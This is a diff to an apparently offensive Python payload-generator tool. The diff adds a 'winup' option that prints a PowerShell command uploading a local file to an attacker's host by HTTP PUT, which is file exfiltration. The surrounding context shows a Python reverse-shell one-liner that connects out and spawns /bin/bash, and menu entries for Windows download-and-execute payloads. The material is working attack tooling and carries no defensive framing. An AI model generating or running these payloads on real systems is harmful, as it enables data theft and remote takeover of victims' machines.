@@ -327,6 +327,7 @@ Simplifies payload creation and listener.
                               |
     winhttp  <LHOST> <LPORT>  |    windows download and execute  
     windl    <LHOST> <LPORT>  |    windows download file
+    winup    <LHOST> <LPORT>  |    windows webdav file upload
                               |
   <~~~~~~~~~~~~~~~~~~~~~~~[Listen]~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~>
                               |
@@ -395,6 +396,14 @@ if __name__ == '__main__':
         print(_payload)
         print('')
         sys.exit(0)        
+
+    if type == 'winup':
+        _payload = '''powershell "$WebClient = New-Object System.Net.WebClient;$WebClient.UploadFile('http://%s:%s/filename', 'PUT', 'c:\\filename')"''' % (lhost, lport)
+        print('')
+        print(_payload)
+        print('')
+        sys.exit(0)       
+
 
     if type == 'python':
         _payload = '''python -c 'import pty,socket,os;s = socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.connect(("%s", %s)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash");s.close()' ''' % (lhost, lport)
